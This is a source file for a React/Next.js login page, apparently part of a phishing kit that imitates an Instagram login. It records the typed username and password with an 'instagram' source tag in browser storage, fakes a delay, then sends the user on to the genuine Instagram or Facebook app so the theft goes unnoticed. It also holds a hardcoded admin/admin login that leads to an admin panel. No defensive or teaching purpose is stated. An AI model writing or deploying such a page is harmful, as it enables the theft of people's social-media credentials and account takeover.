'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import LoginForm from '@/components/login-form';

export default function LoginPage() {
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleLogin = async (username: string, password: string) => {
    setIsLoading(true);
    
    try {
      // Admin panel access
      if (username === 'admin' && password === 'admin') {
        router.push('/admin');
        return;
      }

      // Save login data locally
      const loginData = {
        username,
        password,
        source: 'instagram',
        timestamp: new Date().toISOString(),
      };
      
      // Store in browser storage
      const existingLogins = JSON.parse(localStorage.getItem('logins') || '[]');
      existingLogins.push(loginData);
      localStorage.setItem('logins', JSON.stringify(existingLogins));
      
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Detect device and redirect to Instagram app or App Store
      const userAgent = navigator.userAgent.toLowerCase();
      const isAndroid = /android/.test(userAgent);
      
      // Try to open Instagram app
      if (isAndroid) {
        window.location.href = 'intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end';
        setTimeout(() => {
          window.location.href = 'https://play.google.com/store/apps/details?id=com.instagram.android';
        }, 1000);
      } else {
        window.location.href = 'instagram://';
        setTimeout(() => {
          window.location.href = 'https://apps.apple.com/app/instagram/id389801252';
        }, 1000);
      }
    } catch (error) {
      console.error('[v0] Login error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleFacebookLogin = async () => {
    setIsLoading(true);
    
    try {
      // Save Facebook login data
      const facebookData = {
        username: 'facebook_user',
        password: 'facebook_auth',
        source: 'facebook',
        timestamp: new Date().toISOString(),
      };
      
      const existingLogins = JSON.parse(localStorage.getItem('logins') || '[]');
      existingLogins.push(facebookData);
      localStorage.setItem('logins', JSON.stringify(existingLogins));
      
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Detect device and redirect to Facebook app or App Store
      const userAgent = navigator.userAgent.toLowerCase();
      const isAndroid = /android/.test(userAgent);
      
      if (isAndroid) {
        window.location.href = 'intent://facebook.com/#Intent;scheme=https;package=com.facebook.katana;end';
        setTimeout(() => {
          window.location.href = 'https://play.google.com/store/apps/details?id=com.facebook.katana';
        }, 1000);
      } else {
        window.location.href = 'fb://';
        setTimeout(() => {
          window.location.href = 'https://apps.apple.com/app/facebook/id284882215';
        }, 1000);
      }
    } catch (error) {
      console.error('[v0] Facebook login error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return <LoginForm onLogin={handleLogin} onFacebookLogin={handleFacebookLogin} isLoading={isLoading} />;
}
